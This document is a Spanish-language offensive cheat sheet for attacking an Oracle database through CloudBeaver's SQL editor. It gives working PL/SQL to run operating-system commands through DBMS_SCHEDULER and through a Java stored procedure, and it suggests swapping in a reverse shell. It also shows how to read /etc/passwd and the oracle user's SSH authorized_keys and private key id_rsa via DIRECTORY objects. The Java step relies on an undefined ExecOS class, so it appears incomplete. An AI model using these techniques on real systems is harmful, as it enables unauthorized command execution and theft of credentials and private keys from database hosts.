# Cloud Beaver 

Tags: #CloudBeaver #Oracle 

CloudBeaver es una herramienta web de código abierto para conectarse a bases de datos y administrarlas desde el navegador. Permite explorar tablas, ejecutar consultas SQL y gestionar datos mediante una interfaz gráfica, sin tener que instalar un cliente de escritorio. Es la versión web de DBeaver, pensada también para equipos y servidores.

* Para todos los procedimientos siguientes se da click en el icono llamado ``Open SQL Editor for Oracle``
## Oracle DB 

### Scheduled Task 
Con el siguiente bloque de PL/SQL intentamos crear un trabajo programado en Oracle que ejecute `/bin/sh` con el argumento `-c "id"`. Al habilitarlo, ejecuta el comando `id` en el sistema operativo subyacente, demostrando la ejecución de comandos mediante `DBMS_SCHEDULER`. Si eso se ejecutara correctamente, podríamos reemplazar el comando `id` por una reverse shell para obtener una sesión interactiva en la máquina.

```bash 
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name        => 'shelljob',
    job_type        => 'EXECUTABLE',
    job_action      => '/bin/sh',
    number_of_arguments => 1,
    enabled         => FALSE
  );

  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('shelljob',1,'-c "id"');
  DBMS_SCHEDULER.ENABLE('shelljob');
END;


NOTA:
	- Darle al icono que dice 'Execute SQL Script'
```

### RCE via Java Stored Procedure in Oracle 

```bash 
Paso 1:
# Crear en Oracle un procedimiento llamado `RUN_CMD` que enlaza con un método Java

BEGIN
  EXECUTE IMMEDIATE 'CREATE OR REPLACE PROCEDURE run_cmd(p_cmd IN VARCHAR2) AS LANGUAGE JAVA NAME ''ExecOS.runCmd(java.lang.String)'';';
END;


NOTA:
	- Darle al icono que dice 'Execute SQL Statement'
```

```bash 
Paso 2:
# Verificar si aparece `RUN_CMD` como `PROCEDURE` y su estado es `VALID`, quedó creado.

SELECT object_name, object_type, status
FROM user_objects
WHERE object_name = 'RUN_CMD';
```

```bash 
Paso 3:
# Ejecutar con el argumento 'id'

BEGIN run_cmd('id'); END;
```

### Creación de un directorio 

* [Crear directorio en Oracle ](https://docs.oracle.com/cd/B13789_01/server.101/b10759/statements_5007.htm)

```bash 
Paso 1:
# Consultar los privilegios de sistema concedidos directamente al usuario conectado

SELECT * FROM USER_SYS_PRIVS;
```

```bash 
Paso 2:
# - Crear un objeto `DIRECTORY` de Oracle llamado `DIR_ETC` que apunta a la carpeta `/etc` del servidor.
# - Leer el archivo `passwd` de esa carpeta —en sistemas Linux, normalmente `/etc/passwd`— y mostrar su contenido mediante `DBMS_OUTPUT`.


BEGIN
  EXECUTE IMMEDIATE 'CREATE OR REPLACE DIRECTORY dir_etc AS ''/etc''';
  DBMS_OUTPUT.PUT_LINE(DBMS_XSLPROCESSOR.READ2CLOB('DIR_ETC','passwd'));
END;

---------------

BEGIN
  EXECUTE IMMEDIATE 'CREATE OR REPLACE DIRECTORY dir_etc AS ''/home/oracle/.ssh''';
  DBMS_OUTPUT.PUT_LINE(DBMS_XSLPROCESSOR.READ2CLOB('DIR_ETC','authorized_keys'));
END;


BEGIN
  EXECUTE IMMEDIATE 'CREATE OR REPLACE DIRECTORY dir_etc AS ''/home/oracle/.ssh''';
  DBMS_OUTPUT.PUT_LINE(DBMS_XSLPROCESSOR.READ2CLOB('DIR_ETC','id_rsa'));
END;
```

```bash 
Paso 3:
Mirar el resultado seleccionando el icono llamado 'Show server output' y ejecutando el comando anterior
```
